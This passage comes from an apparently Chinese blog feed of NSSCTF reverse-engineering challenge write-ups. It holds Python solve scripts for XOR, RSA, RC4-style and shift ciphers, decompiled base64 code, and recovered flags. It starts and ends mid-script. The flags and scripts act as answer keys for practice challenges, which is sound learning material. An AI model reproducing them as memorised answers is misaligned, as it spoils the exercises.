range(len(l)):<br>    random.seed(l[i])<br>    for n in range(5):<br>        key.append(random.getrandbits(8))<br>print(key)<br># result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]<br></code></pre></td></tr></table></figure><p>再把key提取出来，再异或</p><p><img src="/./img/49277317_A3G5FKHPZOqt9JNJ/1719898074578-d8c33f43-94fd-488e-8cf8-e1818ce44496-974655.png" alt="1719898074578-d8c33f43-94fd-488e-8cf8-e1818ce44496.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">import random<br>flag = &#x27;xxxxxxxxxxxxxxxxxxxx&#x27;<br>result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]<br>key = [135, 91, 149, 7, 215, 222, 193, 206, 108, 233, 219, 53, 164, 47, 181, 111, 123, 185, 25, 137]<br>random.seed(1)<br>l = []<br>for i in range(4):<br>    l.append(random.getrandbits(8))<br>#print(l)<br>for i in range(len(l)):<br>    random.seed(l[i])<br>    for n in range(5):<br>        key.append(random.getrandbits(8))<br>for i in range(len(result)):<br>    print(chr(result[i] ^ key[i]),end=&#x27;&#x27;)<br># result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]<br></code></pre></td></tr></table></figure><p>NSSCTF{FakeE_random}，得到flag</p><blockquote><p>更新: 2024-07-02 13:31:23<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tihnf3qxk2bphuwh">https://www.yuque.com/chaye-apqbl/vsc85q/tihnf3qxk2bphuwh</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BE%8B%E9%A2%98/NSSCTF/esaypyc/"/>
    <url>/2026/01/19/RE/%E4%BE%8B%E9%A2%98/NSSCTF/esaypyc/</url>
    
    <content type="html"><![CDATA[<h1 id="esaypyc"><a href="#esaypyc" class="headerlink" title="esaypyc"></a>esaypyc</h1><p>前面都是正常的py逆向，不过多赘述</p><p>有意思的初次碰到rsa算法，虽然是入门的</p><h1 id="基础的exp附上"><a href="#基础的exp附上" class="headerlink" title="基础的exp附上"></a>基础的exp附上</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">import gmpy2<br>from Crypto.Util.number import long_to_bytes<br><br>q = 189239861511125143212536989589123569301<br>p = 386123125371923651191219869811293586459<br><br>e = 65537<br>c = 28767758880940662779934612526152562406674613203406706867456395986985664083182<br># n = 73069886771625642807435783661014062604264768481735145873508846925735521695159<br>n = q * p<br># print(n)<br>d = gmpy2.invert(e, (p - 1) * (q - 1))<br>print(&quot;d=&quot;, d)<br>m = pow(c, d, n)<br>print(m)<br>print(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h1 id="需要re的代码"><a href="#需要re的代码" class="headerlink" title="需要re的代码"></a>需要re的代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python<br># visit https://tool.lu/pyc/ for more information<br># Version: Python 3.7<br><br>from Crypto.Util.number import *<br>flag = b&#x27;************************************&#x27;<br>m = bytes_to_long(flag)<br>e = 0xE6B1BEE47BD63F615C7D0A43C529D219<br>q = 0x861261B1C4F2453537AB548A61634A53964840E48A91BA594A11EDBAEF27ED205CC3B2AAD887BABE05343F0CB6121A6A2AA1E706E85291C3A8471E5F3AFAD72F<br>p = 0x9D1D8B0765EC685C2993291084802593252E12334C5B7E543EF952B864727511499E52D9F61DB84D55C3FB31CABD15A9E7E0E274FBED7C6F882E5550302B0BBB<br>c = 0x1F0FCF30222579024F25DD47C9B1F2FCA131312812CB4614BBFAB1860D3C503FA73E10BCD549368729FED443DB72636D26419F2B1A1DE8DCFF67E675420C8071E0980FEA34C22C0B6F79374EF6056EDCAA393CAEFF223A4986086C1C528CBCB369CB06E65E39C5C10774D174189BE0242B40C39F9159ADAEBB9E0D2AC411CA7E<br></code></pre></td></tr></table></figure><h1 id="这里已经知道pqce了，基本都知道，改一下数据即可"><a href="#这里已经知道pqce了，基本都知道，改一下数据即可" class="headerlink" title="这里已经知道pqce了，基本都知道，改一下数据即可"></a>这里已经知道pqce了，基本都知道，改一下数据即可</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">import gmpy2<br>from Crypto.Util.number import long_to_bytes<br><br>q = 0x861261B1C4F2453537AB548A61634A53964840E48A91BA594A11EDBAEF27ED205CC3B2AAD887BABE05343F0CB6121A6A2AA1E706E85291C3A8471E5F3AFAD72F<br>p = 0x9D1D8B0765EC685C2993291084802593252E12334C5B7E543EF952B864727511499E52D9F61DB84D55C3FB31CABD15A9E7E0E274FBED7C6F882E5550302B0BBB<br><br>e = 0xE6B1BEE47BD63F615C7D0A43C529D219<br>c = 0x1F0FCF30222579024F25DD47C9B1F2FCA131312812CB4614BBFAB1860D3C503FA73E10BCD549368729FED443DB72636D26419F2B1A1DE8DCFF67E675420C8071E0980FEA34C22C0B6F79374EF6056EDCAA393CAEFF223A4986086C1C528CBCB369CB06E65E39C5C10774D174189BE0242B40C39F9159ADAEBB9E0D2AC411CA7E<br><br>n = q * p<br>print(&quot;n=&quot;,n,end=&#x27;\n&#x27;)<br>d = gmpy2.invert(e, (p - 1) * (q - 1))<br>print(&quot;d=&quot;, d,end=&#x27;\n&#x27;)<br>m = pow(c, d, n)<br>print(m)<br>print(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_yA8wI5d7VVC-gKdr/1722237088242-0f503ee1-3dde-44f6-b917-8f7c3af7a449-829585.png" alt="1722237088242-0f503ee1-3dde-44f6-b917-8f7c3af7a449.png"></p><blockquote><p>更新: 2024-07-29 15:12:40<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/rxr69tzgodtk8pgy">https://www.yuque.com/chaye-apqbl/vsc85q/rxr69tzgodtk8pgy</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BE%8B%E9%A2%98/NSSCTF/easyre/"/>
    <url>/2026/01/19/RE/%E4%BE%8B%E9%A2%98/NSSCTF/easyre/</url>
    
    <content type="html"><![CDATA[<h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><h1 id="base64加密的反编译代码"><a href="#base64加密的反编译代码" class="headerlink" title="base64加密的反编译代码"></a>base64加密的反编译代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php">__int64 __fastcall <span class="hljs-title function_ invoke__">encode_one</span>(char *a1, <span class="hljs-keyword">int</span> a2, char *a3, <span class="hljs-keyword">int</span> *a4)<br>&#123;<br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+34h] [rbp-1Ch]</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  unsigned __int8 *v13; <span class="hljs-comment">// [rsp+70h] [rbp+20h]</span><br><br>  v13 = (unsigned __int8 *)a1;<br>  <span class="hljs-keyword">if</span> ( !a1 || !a2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>xFFFFFFFFi64;<br>  v11 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( a2 % <span class="hljs-number">3</span> )<br>    v11 = <span class="hljs-number">3</span> - a2 % <span class="hljs-number">3</span>;<br>  v9 = a2 + v11;<br>  v8 = <span class="hljs-number">8</span> * (a2 + v11) / <span class="hljs-number">6</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v9; i += <span class="hljs-number">3</span> )<br>  &#123;<br>    *a3 = alphabet[(char)*v13 &gt;&gt; <span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">if</span> ( a2 + v11 - <span class="hljs-number">3</span> == i &amp;&amp; v11 )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v11 == <span class="hljs-number">1</span> )<br>      &#123;<br>        v5 = (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(*v13, <span class="hljs-number">6</span>u, <span class="hljs-number">2</span>u);<br>        a3[<span class="hljs-number">1</span>] = alphabet[v5 + (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">4</span>u)];<br>        a3[<span class="hljs-number">2</span>] = alphabet[(char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">1</span>], <span class="hljs-number">4</span>u, <span class="hljs-number">2</span>u)];<br>        a3[<span class="hljs-number">3</span>] = <span class="hljs-number">61</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v11 == <span class="hljs-number">2</span> )<br>      &#123;<br>        a3[<span class="hljs-number">1</span>] = alphabet[(char)<span class="hljs-title function_ invoke__">cmove_bits</span>(*v13, <span class="hljs-number">6</span>u, <span class="hljs-number">2</span>u)];<br>        a3[<span class="hljs-number">2</span>] = <span class="hljs-number">61</span>;<br>        a3[<span class="hljs-number">3</span>] = <span class="hljs-number">61</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v6 = (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(*v13, <span class="hljs-number">6</span>u, <span class="hljs-number">2</span>u);<br>      a3[<span class="hljs-number">1</span>] = alphabet[v6 + (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">4</span>u)];<br>      v7 = (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">1</span>], <span class="hljs-number">4</span>u, <span class="hljs-number">2</span>u);<br>      a3[<span class="hljs-number">2</span>] = alphabet[v7 + (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>u)];<br>      a3[<span class="hljs-number">3</span>] = alphabet[v13[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0x3F</span>];<br>    &#125;<br>    a3 += <span class="hljs-number">4</span>;<br>    v13 += <span class="hljs-number">3</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( a4 )<br>    *a4 = v8;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="404"><a href="#404" class="headerlink" title="404"></a>404</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64,urllib.parse<br>key = &quot;HereIsFlagggg&quot;<br>flag = &quot;xxxxxxxxxxxxxxxxxxx&quot;<br><br>s_box = list(range(256))<br>j = 0<br>for i in range(256):<br>    j = (j + s_box[i] + ord(key[i % len(key)])) % 256<br>    s_box[i], s_box[j] = s_box[j], s_box[i]<br>res = []<br>i = j = 0<br>for s in flag:<br>    i = (i + 1) % 256<br>    j = (j + s_box[i]) % 256<br>    s_box[i], s_box[j] = s_box[j], s_box[i]<br>    t = (s_box[i] + s_box[j]) % 256<br>    k = s_box[t]<br>    res.append(chr(ord(s) ^ k))<br>cipher = &quot;&quot;.join(res)<br>crypt = (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))<br>enc = str(base64.b64decode(crypt),&#x27;utf-8&#x27;)<br>enc = urllib.parse.quote(enc)<br>print(enc)<br># enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1717937134032-d68b3536-93ff-4c10-87b0-c751d06e5e85-950032.png" alt="1717937134032-d68b3536-93ff-4c10-87b0-c751d06e5e85.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64,urllib.parse<br>key = &quot;HereIsFlagggg&quot;<br>enc = &quot;%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA&quot;<br>enc = urllib.parse.unquote(enc)<br>s_box = list(range(256))<br>j = 0<br><br>for i in range(256):<br>    j = (j + s_box[i] + ord(key[i % len(key)])) % 256<br>    s_box[i], s_box[j] = s_box[j], s_box[i]<br>res = []<br>i = j = 0<br><br>for s in enc:<br>    i = (i + 1) % 256<br>    j = (j + s_box[i]) % 256<br>    s_box[i], s_box[j] = s_box[j], s_box[i]<br>    t = (s_box[i] + s_box[j]) % 256<br>    k = s_box[t]<br>    res.append(chr(ord(s) ^ k))<br>cipher = &quot;&quot;.join(res)<br>print(cipher)<br></code></pre></td></tr></table></figure><h1 id="405-简单逆向"><a href="#405-简单逆向" class="headerlink" title="405 简单逆向"></a>405 简单逆向</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag = &#x27;xxxxxxxxxxxxxxxxxxxxx&#x27;<br>s = &#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;<br>result = &#x27;&#x27;<br>for i in range(len(flag)):<br>    s1 = ord(flag[i])//17<br>    s2 = ord(flag[i])%17<br>    result += s[(s1+i)%34]+s[-(s2+i+1)%34]<br>print(result)<br># result = &#x27;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">s =&#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;<br>result = &#x27;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#x27;<br>flag= &#x27;&#x27;<br>for i in range(len(result)//2):<br>    char1 = result[2*i]//两个一组为一个flag<br>    char2 = result[2*i+1]<br><br>    s1=s.index(char1)%34-i<br>    s2=-(s.index(char2)+i+1)%34<br>    for j in range(32, 128):<br>        if j // 17 == s1 and j % 17 == s2:<br>            flag += chr(j)<br>print(flag)<br></code></pre></td></tr></table></figure><h1 id="445"><a href="#445" class="headerlink" title="445"></a>445</h1><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1717917201454-ae1d224f-b664-4a0d-9ec5-7aa8aa6d5cea-765973.png" alt="1717917201454-ae1d224f-b664-4a0d-9ec5-7aa8aa6d5cea.png"></p><p>查壳看到是64位程序，放入64ida</p><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1717917171822-b04d7864-bdcf-4d04-b852-4e230b6eacff-810275.png" alt="1717917171822-b04d7864-bdcf-4d04-b852-4e230b6eacff.png"></p><p>观察主要函数是一个循环，编写逆向脚本</p><p><font style="color:#DF2A3F;">注意，因为a为执行过后的字符串，所以要修改判断的范围，</font></p><p><font style="color:#000000;">if ( (Str[i] &lt;&#x3D; 96 || Str[i] &gt; 98) &amp;&amp; (Str[i] &lt;&#x3D; 64 || Str[i] &gt; 66) )</font></p><p><font style="color:#000000;">要改成if ((ord(char) &lt;&#x3D; </font><font style="color:#DF2A3F;">94</font><font style="color:#117CEE;"> </font><font style="color:#000000;">or ord(char) &gt; </font><font style="color:#DF2A3F;">96)</font><font style="color:#000000;"> and (ord(char) &lt;&#x3D; </font><font style="color:#DF2A3F;">62</font><font style="color:#000000;"> or ord(char) &gt; </font><font style="color:#DF2A3F;">64</font><font style="color:#000000;">)):</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = &quot;ylqq]aycqyp&#123;&quot;<br><br>for char in a:<br>    if ((ord(char) &lt;= 94 or ord(char) &gt; 96) and (ord(char) &lt;= 62 or ord(char) &gt; 64)):<br>        char = chr(ord(char)+2)<br>        print(char,end = &#x27;&#x27;);<br>    else:<br>        char = chr(ord(char)-24)<br>        print(char,end = &#x27;&#x27;);<br></code></pre></td></tr></table></figure><p>得到{nss_c{es{r}</p><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1717917305894-9f2ff6d7-171f-4c8f-acb3-cfd4d8d294bf-793898.png" alt="1717917305894-9f2ff6d7-171f-4c8f-acb3-cfd4d8d294bf.png"></p><p>**提交flag也不成功，看了一下评论区说程序里a可以用{代替所以flag就是：NSSCTF{nss_caesar} **</p><h1 id="1416"><a href="#1416" class="headerlink" title="1416"></a>1416</h1><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1721443980982-eaaa5ee9-dfba-4997-86c1-224994b7226b-059870.png" alt="1721443980982-eaaa5ee9-dfba-4997-86c1-224994b7226b.png"></p><p>看到明文和三个加密函数</p><p>第一个是base64加密</p><p>第二个是字符串顺序打乱</p><p>第三个是自定义加密</p><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1721444087788-ca6aecf2-1811-4fa9-9712-834ba3952f38-985126.png" alt="1721444087788-ca6aecf2-1811-4fa9-9712-834ba3952f38.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php">__int64 __fastcall <span class="hljs-title function_ invoke__">encode_one</span>(char *a1, <span class="hljs-keyword">int</span> a2, char *a3, <span class="hljs-keyword">int</span> *a4)<br>&#123;<br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+34h] [rbp-1Ch]</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  unsigned __int8 *v13; <span class="hljs-comment">// [rsp+70h] [rbp+20h]</span><br><br>  v13 = (unsigned __int8 *)a1;<br>  <span class="hljs-keyword">if</span> ( !a1 || !a2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>xFFFFFFFFi64;<br>  v11 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( a2 % <span class="hljs-number">3</span> )<br>    v11 = <span class="hljs-number">3</span> - a2 % <span class="hljs-number">3</span>;<br>  v9 = a2 + v11;<br>  v8 = <span class="hljs-number">8</span> * (a2 + v11) / <span class="hljs-number">6</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v9; i += <span class="hljs-number">3</span> )<br>  &#123;<br>    *a3 = alphabet[(char)*v13 &gt;&gt; <span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">if</span> ( a2 + v11 - <span class="hljs-number">3</span> == i &amp;&amp; v11 )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v11 == <span class="hljs-number">1</span> )<br>      &#123;<br>        v5 = (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(*v13, <span class="hljs-number">6</span>u, <span class="hljs-number">2</span>u);<br>        a3[<span class="hljs-number">1</span>] = alphabet[v5 + (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">4</span>u)];<br>        a3[<span class="hljs-number">2</span>] = alphabet[(char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">1</span>], <span class="hljs-number">4</span>u, <span class="hljs-number">2</span>u)];<br>        a3[<span class="hljs-number">3</span>] = <span class="hljs-number">61</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v11 == <span class="hljs-number">2</span> )<br>      &#123;<br>        a3[<span class="hljs-number">1</span>] = alphabet[(char)<span class="hljs-title function_ invoke__">cmove_bits</span>(*v13, <span class="hljs-number">6</span>u, <span class="hljs-number">2</span>u)];<br>        a3[<span class="hljs-number">2</span>] = <span class="hljs-number">61</span>;<br>        a3[<span class="hljs-number">3</span>] = <span class="hljs-number">61</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v6 = (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(*v13, <span class="hljs-number">6</span>u, <span class="hljs-number">2</span>u);<br>      a3[<span class="hljs-number">1</span>] = alphabet[v6 + (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">4</span>u)];<br>      v7 = (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">1</span>], <span class="hljs-number">4</span>u, <span class="hljs-number">2</span>u);<br>      a3[<span class="hljs-number">2</span>] = alphabet[v7 + (char)<span class="hljs-title function_ invoke__">cmove_bits</span>(v13[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>u)];<br>      a3[<span class="hljs-number">3</span>] = alphabet[v13[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0x3F</span>];<br>    &#125;<br>    a3 += <span class="hljs-number">4</span>;<br>    v13 += <span class="hljs-number">3</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( a4 )<br>    *a4 = v8;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>切割字符串然后拼接，反过来拼接就行</p><p>flag+&#x3D;tmp[13:26]+tmp[39:52]+tmp[0:13]+tmp[26:39]</p><p><font style="color:#DF2A3F;">第一个参数的变化可以得知每次截取的长度为13，第二个参数即为原来str的起始位置</font></p><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1721444242795-467870c3-f283-4c0b-928a-a362eaeca2a6-152723.png" alt="1721444242795-467870c3-f283-4c0b-928a-a362eaeca2a6.png"></p><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1721444293768-1f348d88-1f78-4382-811c-5bb40cdd2690-132801.png" alt="1721444293768-1f348d88-1f78-4382-811c-5bb40cdd2690.png"></p><p>修改一下看会轻松的多</p><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1721444484321-cf89244e-2daf-422b-a3ed-89e71fefe60e-957333.png" alt="1721444484321-cf89244e-2daf-422b-a3ed-89e71fefe60e.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>a=<span class="hljs-string">&#x27;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>tmp=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(i)&lt;=<span class="hljs-number">64</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i)&gt;<span class="hljs-number">90</span>):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(i)&lt;=<span class="hljs-number">94</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i)&gt;<span class="hljs-number">122</span>):<br>            <span 